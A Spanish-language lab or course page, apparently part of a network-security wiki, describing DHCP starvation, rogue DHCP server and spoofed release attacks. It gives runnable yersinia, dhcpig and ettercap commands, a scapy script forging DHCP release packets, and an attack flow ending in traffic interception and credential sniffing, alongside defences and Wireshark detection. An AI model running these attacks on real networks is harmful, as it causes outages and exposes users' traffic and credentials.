# Ataques DHCP

## 1. DHCP Starvation (Hambre DHCP)

### Objetivo
Agotar todas las IPs del pool DHCP → DoS

### Herramienta: Yersinia
```bash
sudo yersinia -G
# Launch attack > DHCP > sending DISCOVER packet
```

### Herramienta: dhcpig
```bash
sudo apt-get install dhcpig
sudo pig.py eth0
```

### Verificación
```cmd
# Desde cliente legítimo
ipconfig /release
ipconfig /renew
# Resultado: No se obtiene IP
```

### Defensa
- DHCP Snooping
- Port Security (limitar MACs por puerto)
- Rate limiting

---

## 2. DHCP Spoofing / Rogue DHCP

### Objetivo
Configurar un servidor DHCP falso → MITM

### Ataque con Ettercap
```bash
sudo ettercap -T -M dhcp:192.168.1.200-220/255.255.255.0/192.168.1.50
```
Donde:
- `192.168.1.200-220`: Pool de IPs a ofrecer
- `255.255.255.0`: Máscara
- `192.168.1.50`: Gateway falso (IP del atacante)

### Ataque con Yersinia
```bash
sudo yersinia -G
# Launch attack > DHCP > creating DHCP rogue server
# Configurar: IP pool, gateway (atacante), DNS
```

### Verificación
```cmd
# Desde víctima
ipconfig /all
# Ver: Gateway = IP del atacante

tracert 8.8.8.8
# Ver: Primer salto = atacante
```

### Defensa
- DHCP Snooping (trusted/untrusted ports)

---

## 3. DHCP Release Attack

### Objetivo
Forzar a víctimas a liberar su IP

### Con scapy (Python)
```python
from scapy.all import *

# Enviar DHCP Release spoofed
dhcp_release = Ether(dst="ff:ff:ff:ff:ff:ff")/\
               IP(src="192.168.1.10", dst="192.168.1.1")/\
               UDP(sport=68, dport=67)/\
               BOOTP(chaddr="aa:bb:cc:dd:ee:ff", ciaddr="192.168.1.10")/\
               DHCP(options=[("message-type", "release"), "end"])

sendp(dhcp_release)
```

---

## Flujo de Ataque Completo

```
1. Reconocimiento
   └── Identificar servidor DHCP legítimo
   └── Identificar clientes en la red

2. Ataque Starvation (opcional)
   └── Agotar pool del DHCP legítimo
   └── Clientes no pueden renovar

3. Rogue DHCP Server
   └── Atacante ofrece IPs
   └── Gateway = IP atacante
   └── DNS = IP atacante (opcional)

4. MITM establecido
   └── Todo tráfico pasa por atacante
   └── Sniffing de credenciales
   └── Modificación de tráfico
```

## Detección del Ataque

### En Wireshark
```
Filtro: bootp
Buscar:
- Múltiples DISCOVER desde MACs diferentes (Starvation)
- OFFER desde IP no autorizada (Rogue DHCP)
```

### En el Switch (con DHCP Snooping)
```
Status > System Logs
Buscar: DHCP Snooping violation
```

---

## Ver también

- [DHCP Snooping](../../02_configuracion/seguridad/dhcp_snooping.md) - **DEFENSA** contra estos ataques
- [Yersinia](../herramientas/yersinia.md) - Herramienta para DHCP Starvation
- [Ettercap](../herramientas/ettercap.md) - Herramienta para DHCP Spoofing
- [Verificación](../../04_defensa/monitoreo/verificacion.md) - Probar defensa

---

[← Volver al Índice](../../INDEX.md)
